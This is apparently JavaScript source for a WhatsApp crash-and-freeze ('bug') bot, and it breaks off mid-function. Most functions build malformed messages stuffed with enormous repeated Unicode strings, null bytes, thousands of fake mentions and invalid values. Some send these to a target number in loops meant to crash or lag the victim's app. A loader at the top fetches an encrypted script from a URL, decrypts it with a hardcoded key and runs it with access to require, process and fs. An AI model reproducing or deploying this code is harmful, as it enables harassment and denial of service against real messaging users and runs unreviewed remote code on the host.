const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function AxMaker2(sock, target) {
  const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 99999999,
         expectedVideoCount: 0, 
      }
   }, {});
  
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #1stRaldzz€xe ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }
  };

  const msg4 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(60000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "support@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ],
               messageAssociation: {
                 associationType: 1,
                 parentMessageKey: album.key
               }
             }
           }
         };

    let msg5 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " #1stRaldzz€xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            statusAttributionType: "SHARED_FROM_MENTION",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              ),
            ]
          }
        }
      }
    }
  }, {});
  
  const msg6 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(60000),
      publisher: "ꦾ".repeat(60000),
      caption: " ### ",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        }
      ],
      fileLength: "999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
       remoteJid: "X",
       participant: "0@s.whatsapp.net",
       stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "0@s.whatsapp.net",
             ...Array.from({ length: 1990 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  }, {});

  for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
  }
}

async function FreezePackk(tdx, target) {
  await tdx.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "[DarkVerse]" + "ꦾ".repeat(500),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

async function urlloc(client, target) { 
  const triggerUI = "ꦾ".repeat(61111);
  await client.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        url: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        thumbnailUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        waWebSocketUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        mediaUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        sourceUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        originalImageUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: triggerUI,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: client.generateMessageTag(),
          virtexId: client.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function DelayVisi(sock, targetJid) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VISI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(900000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(targetJid, Msg, {
      participant: { jid: targetJid }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function VisiIos(sock, targetJid) {
  const Msg = {
    locationMessage: {
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    } 
  }; 

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function VisiBlanking(sock, targetJid) {
  const Msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "VISI",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  id: null
                })
              }
            ],
            version: 3
          }
        }
      }
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function DelayVisi(sock, targetJid) {
  const RumahRoblokKa = generateWAMessageFromContent(
    targetJid,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VSX",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
